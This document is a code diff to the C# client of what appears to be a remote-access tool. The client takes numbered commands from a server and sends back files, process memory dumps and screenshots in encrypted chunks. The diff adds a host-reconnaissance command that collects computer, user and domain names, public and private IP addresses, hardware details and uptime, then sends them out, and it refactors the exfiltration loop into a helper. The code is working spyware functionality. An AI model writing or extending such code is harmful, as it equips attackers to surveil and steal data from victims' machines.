@@ -10,6 +10,9 @@ using Microsoft.Win32.SafeHandles;
 using System.Drawing;
 using System.Drawing.Imaging;
 using System.ServiceModel.Channels;
+using System.Management;
+using Microsoft.Win32;
+using System.Net;
 
 namespace Client_side
 {
@@ -17,10 +20,10 @@ namespace Client_side
     {
         public static readonly int MaxChunkSize = 4096;
         public static object NativeMethods { get; private set; }
+        private static readonly string delimiter = "|;|";
 
         public static void ProcessCommand(string command, Encryptor encryptor)
         {
-            string delimiter = "|;|";
             string[] commandParts = command.Split(delimiter);
             string id = commandParts[0];
             switch (id)
@@ -39,24 +42,25 @@ namespace Client_side
                         string fileLength = fileChunks.Count.ToString();
                         string fileName = $"{commandParts[1]}";
 
-                        // Send the file ID, file name and the number of chunks
                         string fileHeader = $"{fileID}{delimiter}{fileLength}{delimiter}{fileName}";
                         byte[] encryptedHeader = encryptor.Encrypt(fileHeader);
                         NetworkLayer.SendResult(encryptedHeader);
-                        // Send the file chunks
-                        int counter = 0;
-                        foreach (string chunk in fileChunks)
-                        {
-                            string formattedChunk = $"{fileID}{delimiter}{chunk}{delimiter}{counter}";
-                            byte[] encryptedChunk = encryptor.Encrypt(formattedChunk);
-                            NetworkLayer.SendResult(encryptedChunk);
-                            Thread.Sleep(10);
-                            counter++;
-                        }
+
+                        SendChunks(fileChunks, encryptor, fileID);
                         break;
                     }
                 case "3":
                     {
+                        List<string> systemInfoChunks = GetSystemInfo();
+                        string fileID = Guid.NewGuid().ToString();
+                        string fileLength = systemInfoChunks.Count.ToString();
+                        string fileName = $"{commandParts[1]}.txt";
+
+                        string fileHeader = $"{fileID}{delimiter}{fileLength}{delimiter}{fileName}";
+                        byte[] encryptedHeader = encryptor.Encrypt(fileHeader);
+                        NetworkLayer.SendResult(encryptedHeader);
+
+                        SendChunks(systemInfoChunks, encryptor, fileID);
                         break;
                     }
                 case "4":
@@ -66,20 +70,11 @@ namespace Client_side
                         string fileLength = dumpChunks.Count.ToString();
                         string fileName = $"dump{commandParts[1]}.dmp";
 
-                        // Send the file ID, file name and the number of chunks
                         string fileHeader = $"{fileID}{delimiter}{fileLength}{delimiter}{fileName}";
                         byte[] encryptedHeader = encryptor.Encrypt(fileHeader);
                         NetworkLayer.SendResult(encryptedHeader);
-                        // Send the file chunks
-                        int counter = 0;
-                        foreach (string chunk in dumpChunks)
-                        {
-                            string formattedChunk = $"{fileID}{delimiter}{chunk}{delimiter}{counter}";
-                            byte[] encryptedChunk = encryptor.Encrypt(formattedChunk);
-                            NetworkLayer.SendResult(encryptedChunk);
-                            Thread.Sleep(10);
-                            counter++;
-                        }
+
+                        SendChunks(dumpChunks, encryptor, fileID);
                         break;
                     }
                 case "5":
@@ -89,21 +84,11 @@ namespace Client_side
                         string fileLength = screenShotChunks.Count.ToString();
                         string fileName = "screenshot.png";
 
-                        // Send the file ID, file name and the number of chunks
                         string fileHeader = $"{fileID}{delimiter}{fileLength}{delimiter}{fileName}";
                         byte[] encryptedHeader = encryptor.Encrypt(fileHeader);
                         NetworkLayer.SendResult(encryptedHeader);
 
-                        // Send the file chunks
-                        int counter = 0;
-                        foreach (string chunk in screenShotChunks)
-                        {
-                            string formattedChunk = $"{fileID}{delimiter}{chunk}{delimiter}{counter}";
-                            byte[] encryptedChunk = encryptor.Encrypt(formattedChunk);
-                            NetworkLayer.SendResult(encryptedChunk);
-                            Thread.Sleep(10); // Sleep for 10ms to avoid packet loss
-                            counter++;
-                        }
+                        SendChunks(screenShotChunks, encryptor, fileID);
                         break;
                     }
                 case "6":
@@ -292,6 +277,131 @@ namespace Client_side
                 }
             }
             return chunks;
+        }
+
+        private static List<String> GetSystemInfo()
+        {
+            List<String> chunks = new();
+            string systemInfo = "";
+
+            // Retrieve the system information using Registry
+
+            // Computer Name
+            string path = @"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\ComputerName\ActiveComputerName";
+            using (RegistryKey key = Registry.LocalMachine.OpenSubKey(path))
+            {
+                if (key != null)
+                {
+                    systemInfo += $"Computer Name: {key.GetValue("ComputerName")}\n";
+                }
+            }
+
+            // OS Version
+            string osVersion = Environment.OSVersion.ToString();
+            systemInfo += $"OS Version: {osVersion}\n";
+
+            // OS Name
+            path = @"SOFTWARE\Microsoft\Windows NT\CurrentVersion";
+            using (RegistryKey key = Registry.LocalMachine.OpenSubKey(path))
+            {
+                if (key != null)
+                {
+                    systemInfo += $"OS Name: {key.GetValue("productName")}\n";
+                }
+            }
+
+            // CPU Name
+            path = @"HARDWARE\DESCRIPTION\System\CentralProcessor\0";
+            using (RegistryKey key = Registry.LocalMachine.OpenSubKey(path))
+            {
+                if (key != null)
+                {
+                    systemInfo += $"CPU Name: {key.GetValue("processorNameString")}\n";
+                }
+            }
+
+            // User Name
+            systemInfo += $"User Name: {Environment.UserName}\n";
+
+            // Domain Name
+            systemInfo += $"Domain Name: {Environment.UserDomainName}\n";
+
+            // Public IP Address
+            systemInfo += $"Public IP Address: {new WebClient().DownloadString("https://ipinfo.io/ip")}\n";
+
+            // Private IP Address
+            string hostName = Dns.GetHostName();
+            IPHostEntry ipEntry = Dns.GetHostEntry(hostName);
+            IPAddress[] addr = ipEntry.AddressList;
+            systemInfo += $"Private IP Address: {addr[addr.Length - 1]}\n";
+
+            // System Time
+            systemInfo += $"System Time: {DateTime.Now}\n";
+
+            // System TimeZone
+            systemInfo += $"System Time Zone: {TimeZoneInfo.Local.DisplayName}\n";
+
+            // System Uptime
+            ManagementObjectSearcher searcher = new("SELECT LastBootUpTime FROM Win32_OperatingSystem");
+            ManagementObjectCollection collection = searcher.Get();
+            foreach (ManagementObject obj in collection)
+            {
+                DateTime lastBootUpTime = ManagementDateTimeConverter.ToDateTime(obj["LastBootUpTime"].ToString());
+                TimeSpan uptime = DateTime.Now.ToUniversalTime() - lastBootUpTime.ToUniversalTime();
+                systemInfo += $"System Uptime: {uptime.Days} days, {uptime.Hours} hours, {uptime.Minutes} minutes\n";
+            }
+
+            // System Architecture
+            if (Environment.Is64BitOperatingSystem)
+            {
+                systemInfo += "System Architecture: 64-bit\n";
+            }
+            else
+            {
+                systemInfo += "System Architecture: 32-bit\n";
+            }
+
+            // System Memory
+            ManagementObjectSearcher searcher2 = new("SELECT TotalVisibleMemorySize, FreePhysicalMemory FROM Win32_OperatingSystem");
+            ManagementObjectCollection collection2 = searcher2.Get();
+            foreach (ManagementObject obj in collection2)
+            {
+                ulong totalMemory = (ulong)obj["TotalVisibleMemorySize"];
+                ulong freeMemory = (ulong)obj["FreePhysicalMemory"];
+                systemInfo += $"System Memory: {totalMemory / 1024} MB Total, {freeMemory / 1024} MB Free\n";
+            }
+
+            // System Disk Space
+            ManagementObjectSearcher searcher4 = new("SELECT FreeSpace, Size FROM Win32_LogicalDisk WHERE DeviceID = 'C:'");
+            ManagementObjectCollection collection4 = searcher4.Get();
+            foreach (ManagementObject obj in collection4)
+            {
+                ulong freeSpace = (ulong)obj["FreeSpace"];
+                ulong totalSpace = (ulong)obj["Size"];
+                systemInfo += $"System Disk Space: {totalSpace / 1024 / 1024 / 1024} GB Total, {freeSpace / 1024 / 1024 / 1024} GB Free\n";
+            }
+            
+            systemInfo = Encryptor.ConvertStr(Encoding.UTF8.GetBytes(systemInfo));
+
+            for (int i = 0; i < systemInfo.Length; i += MaxChunkSize)
+            {
+                chunks.Add(systemInfo.Substring(i, Math.Min(MaxChunkSize, systemInfo.Length - i)));
+            }
+
+            return chunks;
+        }
+
+        private static void SendChunks(List<string> chunks, Encryptor encryptor, string fileID)
+        {
+            int counter = 0;
+            foreach (string chunk in chunks)
+            {
+                string formattedChunk = $"{fileID}{delimiter}{chunk}{delimiter}{counter}";
+                byte[] encryptedChunk = encryptor.Encrypt(formattedChunk);
+                NetworkLayer.SendResult(encryptedChunk);
+                Thread.Sleep(10);
+                counter++;
+            }
         }
     }
 }
